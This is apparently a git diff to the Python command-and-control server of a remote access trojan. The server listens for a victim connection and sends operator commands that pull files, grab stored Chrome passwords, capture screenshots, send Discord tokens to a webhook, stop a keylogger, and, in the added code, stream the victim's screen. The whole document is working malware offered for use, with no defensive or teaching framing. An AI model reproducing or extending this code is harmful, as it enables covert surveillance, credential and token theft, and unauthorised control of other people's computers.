@@ -3,6 +3,7 @@ import termcolor
 import json
 import os
 import time
+from vidstream import StreamingServer
 
 
 def reliable_recv():
@@ -34,11 +35,15 @@ def download_file(file_name):
             break
     target.settimeout(None)
     f.close()
-
+def stream():
+    server = StreamingServer('192.168.10.122', 9999)
+    server.start_server()
+    reliable_send("stream")
 
 def target_communication():
     count = 0
     while True:
+        global ip
         command = input('* Shell~%s: ' % str(ip))
         reliable_send(command)
         if command == 'quit':
@@ -52,11 +57,13 @@ def target_communication():
         elif command[:8] == 'download':
             download_file(command[9:])
         elif command [:10] == "chromegrab":
-            time.sleep(5)
-            download_file("log.txt")
-            print("the passwords are saved in log.txt")
+            time.sleep(10)
+            try:
+                download_file("log.txt")
+            except:
+                print("failed to get chrome password")
         elif command[:10] == 'screenshot':
-            f = open('screenshot%d' % (count), 'wb')
+            f = open('screenshot%d.jpg' % (count), 'wb')
             target.settimeout(3)
             chunk = target.recv(1024)
             while chunk:
@@ -67,11 +74,22 @@ def target_communication():
                     break
             target.settimeout(None)
             f.close()
+            print("screenshot saved as screenshot%d.jpg" % count)
             count += 1
-	elif command[:6] == "dtoken":
-		print("token will be sent through your discord webhook")
+            continue
+        elif command[:6] == "dtoken":
+            print("token will be sent through your discord webhook")
+        elif command == "keylog_stop":
+            print("keylog has been stopped")
+        elif command == "stream":
+            stream()
+        elif command == "stop_stream":
+            server = StreamingServer('192.168.10.122', 9999)
+            server.stop_server()
+            reliable_send("stop_stream")
+            print("stream has been stopped")
         elif command == 'help':
-	            print(termcolor.colored('''\n
+	            print(termcolor.colored('''
                 quit                                --> Quit Session With The Target
                 clear                               --> Clear The Screen
                 cd *Directory Name*                 --> Changes Directory On Target System
@@ -92,6 +110,7 @@ def target_communication():
 print("""
 
 
+
 ██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░
 ██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗╚════██╗
 ██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝░░███╔═╝
@@ -102,11 +121,10 @@ print("""
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.10.116', 5555))
+sock.bind(('192.168.10.122', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
 print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
 print(termcolor.colored("'help' for options", 'green'))
 target_communication()
-
